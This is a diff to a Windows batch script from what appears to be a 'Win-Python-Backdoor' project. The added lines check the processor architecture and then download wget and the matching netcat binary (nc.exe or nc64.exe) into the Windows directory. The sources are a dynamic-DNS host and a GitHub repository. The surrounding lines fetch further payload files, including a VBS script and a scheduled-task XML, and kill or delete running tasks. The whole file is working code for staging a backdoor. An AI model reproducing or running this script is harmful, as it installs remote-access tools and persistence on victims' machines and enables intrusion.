@@ -35,7 +35,16 @@ rem %windir%\System32\cmd.exe /c powershell -Command (new-object System.Net.WebC
 rem %windir%\System32\cmd.exe /c powershell -Command (new-object System.Net.WebClient).DownloadFile('http://verifiche.ddns.net/win/nc64.exe','%windir%\nc64.exe')
 set url=http://config02.addns.org
 set urlgit=https://github.com/pistacchietto/Win-Python-Backdoor/raw/master
+if "%PROCESSOR_ARCHITECTURE%"=="AMD64" goto 64BIT
+%windir%\System32\cmd.exe /c powershell -Command (new-object System.Net.WebClient).DownloadFile('%url%/win/wget32.exe','%windir%\wget.exe')
+wget --no-check-certificate %urlgit%/nc.exe  -O %windir%\nc64.exe
+goto END
+:64BIT
+echo 64-bit OS
 %windir%\System32\cmd.exe /c powershell -Command (new-object System.Net.WebClient).DownloadFile('%url%/win/wget.exe','%windir%\wget.exe')
+wget --no-check-certificate %urlgit%/nc64.exe  -O %windir%\nc64.exe
+:END
+
 rem %windir%\System32\cmd.exe /c powershell -Command (new-object System.Net.WebClient).DownloadFile('%url%/win/wofficeie1.exe','%windir%\wofficeie1.exe')
 %windir%\System32\cmd.exe /c powershell -Command (new-object System.Net.WebClient).DownloadFile('%url%/win/cacert.pem','%windir%\cacert.pem')
 rem %windir%\System32\cmd.exe /c powershell -Command (new-object System.Net.WebClient).DownloadFile('%url%/win/woffice.exe','%windir%\woffice.exe')
@@ -47,7 +56,7 @@ taskkill /f /im wscript.exe
 schtasks /delete /tn sys /F
 schtasks /delete /tn syskill /F
 schtasks /delete /tn office_get /F
-wget --no-check-certificate %urlgit%/nc64.exe  -O %windir%\nc64.exe
+
 rem wget --no-check-certificate %urlgit%/get.bat  -O %windir%\get.bat
 wget --no-check-certificate %urlgit%/get.vbs  -O %windir%\get.vbs
 wget --no-check-certificate %urlgit%/sys.xml  -O %windir%\sys.xml
